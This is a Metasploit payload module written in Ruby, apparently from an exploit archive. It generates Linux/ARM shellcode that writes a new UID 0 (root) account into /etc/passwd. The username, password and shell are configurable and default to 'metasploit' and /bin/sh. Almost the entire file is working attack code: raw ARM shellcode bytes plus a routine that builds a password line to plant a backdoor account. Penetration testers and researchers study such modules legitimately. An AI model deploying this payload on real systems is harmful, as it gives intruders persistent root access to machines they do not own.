linux/ARM (Meta) Create a New User with UID 0
=============================================

# Exploit Title: Linux/ARM - Create a new user with UID 0 (MSF)
# Date: 2010-11-25
# Author: Jonathan Salwan - twitter @shell_storm
# Tested on: ARM926EJ-S rev 5 (v5l)
# Issue link: https://metasploit.com/redmine/issues/3254
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
 
###
#
# AddUser
# -------
#
# Adds a UID 0 user to /etc/passwd.
#
###
module Metasploit3
 
        include Msf::Payload::Single
        include Msf::Payload::Linux
 
        def initialize(info = {})
                super(merge_info(info,
                        &#039;Name&#039;          => &#039;Linux Add User&#039;,
                        &#039;Version&#039;       => &#039;???&#039;,
                        &#039;Description&#039;   => &#039;Create a new user with UID 0&#039;,
                        &#039;Author&#039;        => [ &#039;Jonathan Salwan&#039; ],
                        &#039;License&#039;       => MSF_LICENSE,
                        &#039;Platform&#039;      => &#039;linux&#039;,
                        &#039;Arch&#039;          => ARCH_ARMLE,
                        &#039;Privileged&#039;    => true))
 
                # Register adduser options
                register_options(
                        [
                                OptString.new(&#039;USER&#039;,  [ true,  "The username to create",     "metasploit" ]),
                                OptString.new(&#039;PASS&#039;,  [ true,  "The password for this user", "metasploit" ]),
                                OptString.new(&#039;SHELL&#039;, [ false, "The shell for this user",    "/bin/sh"    ]),
                        ], self.class)
        end
 
        #
        # Dynamically builds the adduser payload based on the user&#039;s options.
        #
        def generate_stage
                user    = datastore[&#039;USER&#039;]  || &#039;metasploit&#039;
                pass    = datastore[&#039;PASS&#039;]  || &#039;metasploit&#039;
                shell   = datastore[&#039;SHELL&#039;] || &#039;/bin/sh&#039;
                str     = "#{user}:#{pass.crypt(&#039;Az&#039;)}:0:0::/:#{shell}\n"
                strl1   = [ (str.length)+52 ].pack(&#039;C*&#039;)
                strl2   = [ str.length ].pack(&#039;C*&#039;)
                pwdir   = "/etc/passwd"
                payload =
                        "\x05\x50\x45\xe0\x01\x50\x8f\xe2\x15\xff\x2f\xe1" +
                        "\x78\x46"+ strl1 + "\x30\xff\x21\xff\x31\xff\x31" +
                        "\xff\x31\x45\x31\xdc\x22\xc8\x32\x05\x27\x01\xdf" +
                        "\x80\x46\x41\x46\x08\x1c\x79\x46\x18\x31\xc0\x46" +
                        strl2 + "\x22\x04\x27\x01\xdf\x41\x46\x08\x1c\x06" +
                        "\x27\x01\xdf\x1a\x49\x08\x1c\x01\x27\x01\xdf" +
                        str + pwdir
 
        end
 
end



